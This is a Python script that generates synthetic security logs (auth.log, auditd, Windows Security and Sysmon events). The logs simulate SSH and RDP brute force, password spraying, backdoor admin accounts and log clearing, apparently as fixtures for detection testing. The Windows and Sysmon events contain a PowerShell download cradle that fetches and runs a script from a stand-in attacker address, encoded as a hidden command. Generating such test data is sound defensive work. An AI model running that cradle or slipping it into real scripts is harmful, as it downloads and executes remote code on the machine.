"""Generate the synthetic attack scenario in sample_logs/.

All IP addresses are from the RFC 5737 documentation ranges, and every host,
user and domain is made up. Run: python tools/generate_samples.py
"""

from __future__ import annotations

import base64
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "sample_logs"
random.seed(1102)


def ps_encode(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


def auth_log() -> list[str]:
    lines = []
    t = datetime(2026, 11, 10, 2, 13, 4)
    pid = 41210

    def line(ts, msg, host="web01"):
        return f"{ts:%b %d %H:%M:%S} {host} {msg}"

    # Normal admin activity
    lines.append(line(t - timedelta(hours=1), f"sshd[{pid}]: Accepted publickey for deploy from 192.0.2.10 port 50122 ssh2"))
    lines.append(line(t - timedelta(minutes=50), f"sshd[{pid+1}]: Failed password for alice from 192.0.2.44 port 50310 ssh2"))
    lines.append(line(t - timedelta(minutes=49), f"sshd[{pid+2}]: Accepted password for alice from 192.0.2.44 port 50311 ssh2"))

    # 1) Brute force against root that eventually succeeds (203.0.113.45)
    for i in range(24):
        ts = t + timedelta(seconds=i * 7 + random.randint(0, 3))
        lines.append(line(ts, f"sshd[{pid+10+i}]: Failed password for root from 203.0.113.45 port {40000+i} ssh2"))
    ts += timedelta(seconds=9)
    lines.append(line(ts, f"sshd[{pid+40}]: Accepted password for root from 203.0.113.45 port 40031 ssh2"))
    # Attacker persists: new user, added to sudo
    ts += timedelta(minutes=3)
    lines.append(line(ts, "useradd[41301]: new group: name=svc-backup, GID=1003"))
    lines.append(line(ts, "useradd[41301]: new user: name=svc-backup, UID=1003, GID=1003, home=/home/svc-backup, shell=/bin/bash, from=/dev/pts/1"))
    ts += timedelta(minutes=1)
    lines.append(line(ts, "usermod[41305]: add 'svc-backup' to group 'sudo'"))

    # 2) Password spraying across many usernames (198.51.100.77)
    users = ["admin", "oracle", "test", "ubuntu", "postgres", "git", "jenkins", "ftpuser", "pi", "support"]
    ts = t + timedelta(hours=2)
    for i, u in enumerate(users * 2):
        ts += timedelta(seconds=random.randint(10, 25))
        if u in {"admin", "oracle", "test", "pi", "support", "jenkins", "ftpuser"}:
            lines.append(line(ts, f"sshd[{pid+100+i}]: Invalid user {u} from 198.51.100.77 port {52000+i}"))
            lines.append(line(ts, f"sshd[{pid+100+i}]: Failed password for invalid user {u} from 198.51.100.77 port {52000+i} ssh2"))
        else:
            lines.append(line(ts, f"sshd[{pid+100+i}]: Failed password for {u} from 198.51.100.77 port {52000+i} ssh2"))

    # 3) A few typos that must NOT alert
    ts = t + timedelta(hours=5)
    for i in range(3):
        lines.append(line(ts + timedelta(seconds=i * 20), f"sshd[{pid+300+i}]: Failed password for bob from 192.0.2.80 port {53000+i} ssh2"))
    lines.append(line(ts + timedelta(minutes=1), f"sshd[{pid+310}]: Accepted password for bob from 192.0.2.80 port 53010 ssh2"))
    lines.append(line(ts + timedelta(minutes=2), "CRON[41999]: pam_unix(cron:session): session opened for user root by (uid=0)"))
    return lines


def windows_events() -> list[dict]:
    base = datetime(2026, 11, 10, 9, 0, 0, tzinfo=timezone.utc)
    ev = []

    def add(minutes, **fields):
        fields["TimeCreated"] = (base + timedelta(minutes=minutes)).isoformat().replace("+00:00", "Z")
        ev.append(fields)

    # Normal logons
    add(0, EventID=4624, Computer="WS-FIN-07.corp.example", TargetUserName="thandi", IpAddress="10.20.4.17", LogonType=2)
    add(2, EventID=4688, Computer="WS-FIN-07.corp.example", SubjectUserName="thandi",
        NewProcessName="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        CommandLine="powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1",
        ParentProcessName="C:\\Windows\\System32\\svchost.exe")

    # Phishing doc spawns encoded PowerShell download cradle
    cradle = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/update.ps1')"
    add(14, EventID=4688, Computer="WS-FIN-07.corp.example", SubjectUserName="thandi",
        NewProcessName="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        CommandLine=f"powershell.exe -nop -w hidden -enc {ps_encode(cradle)}",
        ParentProcessName="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE")

    # RDP brute force against the jump host from an external IP
    for i in range(15):
        add(30 + i * 0.2, EventID=4625, Computer="JUMP01.corp.example", TargetUserName="administrator",
            IpAddress="203.0.113.199", LogonType=10, Status="0xc000006d", SubStatus="0xc000006a")

    # Attacker creates a backdoor admin on the workstation
    add(41, EventID=4720, Computer="WS-FIN-07.corp.example", TargetUserName="helpdesk2", SubjectUserName="thandi")
    add(43, EventID=4732, Computer="WS-FIN-07.corp.example", TargetUserName="Administrators",
        MemberName="CN=helpdesk2,CN=Users,DC=corp,DC=example", SubjectUserName="thandi")
    # A routine group change that must NOT be treated as privileged
    add(50, EventID=4732, Computer="WS-FIN-07.corp.example", TargetUserName="Finance-Readers",
        MemberName="CN=sipho,CN=Users,DC=corp,DC=example", SubjectUserName="it-admin")
    # And then covers tracks
    add(55, EventID=1102, Computer="WS-FIN-07.corp.example", SubjectUserName="thandi")
    return ev


def sysmon_events() -> list[dict]:
    """The same WS-FIN-07 intrusion as seen by Sysmon, plus benign noise."""
    base = datetime(2026, 11, 10, 9, 0, 0)
    ev = []
    host = "WS-FIN-07.corp.example"
    word = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
    ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    cradle = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/update.ps1')"

    def add(minutes, event_id, **fields):
        ts = base + timedelta(minutes=minutes)
        fields = {"EventID": event_id, "Channel": "Microsoft-Windows-Sysmon/Operational",
                  "Computer": host, "UtcTime": ts.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], **fields}
        ev.append(fields)

    # Benign: Word saving a document, OneDrive syncing, Edge browsing
    add(5, 11, Image=word, TargetFilename="C:\\Users\\thandi\\Documents\\Q3 budget.docx", User="CORP\\thandi")
    add(6, 3, Image="C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe", User="CORP\\thandi",
        SourceIp="10.20.4.17", DestinationIp="192.0.2.200", DestinationPort=443, DestinationHostname="sync.example.net")
    add(7, 1, Image="C:\\Windows\\System32\\cmd.exe", ParentImage="C:\\Windows\\explorer.exe",
        CommandLine="cmd.exe /c ipconfig /all", User="CORP\\thandi")

    # Malicious: invoice.docm macro -> PowerShell cradle -> download -> payload on disk
    add(13.9, 11, Image=word, TargetFilename="C:\\Users\\thandi\\AppData\\Local\\Temp\\~invoice.vbs", User="CORP\\thandi")
    add(14, 1, Image=ps, ParentImage=word, User="CORP\\thandi",
        CommandLine=f"powershell.exe -nop -w hidden -enc {ps_encode(cradle)}",
        Hashes="SHA256=" + "0" * 64)
    for i in range(3):
        add(14.1 + i * 0.1, 3, Image=ps, User="CORP\\thandi", SourceIp="10.20.4.17",
            DestinationIp="198.51.100.23", DestinationPort=80)
    add(14.5, 11, Image=ps, TargetFilename="C:\\Users\\thandi\\AppData\\Local\\Temp\\update.exe", User="CORP\\thandi")
    return ev


def audit_log() -> list[str]:
    """web02 runs auditd: an SSH brute force that lands, then a backdoor account added to wheel."""
    t = datetime(2026, 11, 10, 3, 40, 0, tzinfo=timezone.utc).timestamp()
    serial = 9100
    lines = []

    def rec(offset, rtype, body):
        nonlocal serial
        serial += 1
        lines.append(f"node=web02 type={rtype} msg=audit({t + offset:.3f}:{serial}): {body}")

    sshd = 'exe="/usr/sbin/sshd" hostname={ip} addr={ip} terminal=ssh'
    pam = "pid={pid} uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op={op} grantors={g} acct=\"{acct}\" " + sshd + " res={res}'"

    # Normal key-based admin login from the internal bastion
    rec(-3600, "USER_LOGIN", pam.format(pid=700, op="login", g="?", acct="ops", ip="10.0.8.4", res="success").replace("grantors=? ", ""))
    # Brute force: each failure writes USER_AUTH and USER_LOGIN
    for i in range(14):
        rec(i * 6, "USER_AUTH", pam.format(pid=800 + i, op="PAM:authentication", g="?", acct="root", ip="203.0.113.60", res="failed"))
        rec(i * 6 + 0.01, "USER_LOGIN", pam.format(pid=800 + i, op="login", g="?", acct="root", ip="203.0.113.60", res="failed").replace("grantors=? ", ""))
    rec(90, "USER_AUTH", pam.format(pid=900, op="PAM:authentication", g="pam_unix", acct="root", ip="203.0.113.60", res="success"))
    rec(90.2, "USER_LOGIN", pam.format(pid=900, op="login", g="?", acct="root", ip="203.0.113.60", res="success").replace("grantors=? ", ""))
    # Persistence: hex-encoded acct (auditd does this for unusual names), then wheel membership
    acct_hex = "systemd-sync".encode().hex().upper()
    rec(240, "ADD_GROUP", "pid=950 uid=0 auid=0 ses=7 msg='op=add-group id=1004 exe=\"/usr/sbin/useradd\" hostname=? addr=? terminal=pts/0 res=success'")
    rec(240.1, "ADD_USER", f"pid=950 uid=0 auid=0 ses=7 msg='op=add-user acct={acct_hex} exe=\"/usr/sbin/useradd\" hostname=? addr=? terminal=pts/0 res=success'")
    rec(300, "USER_MGMT", "pid=960 uid=0 auid=0 ses=7 msg='op=add-user-to-group grp=\"wheel\" acct=\"systemd-sync\" exe=\"/usr/sbin/usermod\" hostname=? addr=? terminal=pts/0 res=success'")
    # Noise that must be ignored
    rec(310, "SYSCALL", "arch=c000003e syscall=59 success=yes exit=0 a0=55d1 items=2 ppid=950 pid=961 auid=0 uid=0 comm=\"id\" exe=\"/usr/bin/id\"")
    rec(320, "CRED_ACQ", pam.format(pid=970, op="PAM:setcred", g="pam_unix", acct="root", ip="?", res="success"))
    return lines


def main() -> None:
    OUT.mkdir(exist_ok=True)
    (OUT / "audit.log").write_text("\n".join(audit_log()) + "\n", encoding="utf-8")
    with (OUT / "sysmon.jsonl").open("w", encoding="utf-8") as fh:
        for record in sysmon_events():
            fh.write(json.dumps(record) + "\n")
    (OUT / "auth.log").write_text("\n".join(auth_log()) + "\n", encoding="utf-8")
    with (OUT / "windows_security.jsonl").open("w", encoding="utf-8") as fh:
        for record in windows_events():
            fh.write(json.dumps(record) + "\n")
    print(f"wrote samples to {OUT}")


if __name__ == "__main__":
    main()
